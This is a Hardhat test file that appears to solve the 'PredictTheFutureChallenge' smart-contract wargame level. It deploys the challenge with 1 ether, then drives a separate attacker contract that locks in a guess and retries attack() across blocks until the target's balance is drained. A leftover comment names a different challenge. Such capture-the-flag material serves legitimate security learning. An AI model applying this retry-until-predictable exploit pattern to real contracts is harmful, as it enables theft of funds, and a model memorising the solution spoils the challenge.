import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('PredictTheFutureChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheFutureChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    /**
     * YOUR CODE HERE
     * */

    // Deploy our own Attacker contract GuessTheNewNumberChallengeAttacker
    // And use contract address from target as input
    const attackFactory = await ethers.getContractFactory('PredictTheFutureAttacker');
    const attackContract = await attackFactory.deploy(target.address);
    await attackContract.deployed();

    // Call the lockInGuess() function
    const tx1 = await attackContract.lockInGuess({ value: utils.parseEther('1') });
    await tx1.wait();

    // We need to call the attack function several times
    const maxAttempts = 50; // Set a maximum number of attempts
    for (let i = 0; i < maxAttempts; i++) {
      try {
        const tx2 = await attackContract.attack();
        await tx2.wait();

        if (await target.isComplete()) {
          console.log('Attack successful!');
          expect(await provider.getBalance(target.address)).to.equal(0);
          expect(await target.isComplete()).to.equal(true);
          break; // Exit loop if the attack succeeds
        }
      } catch (error) {
        console.log(`Attempt ${i + 1} failed, trying again...`);
      }

      // Wait for a new block before the next attempt
      await new Promise((resolve) => setTimeout(resolve, 15000)); // 15-second delay
    }
  });
});
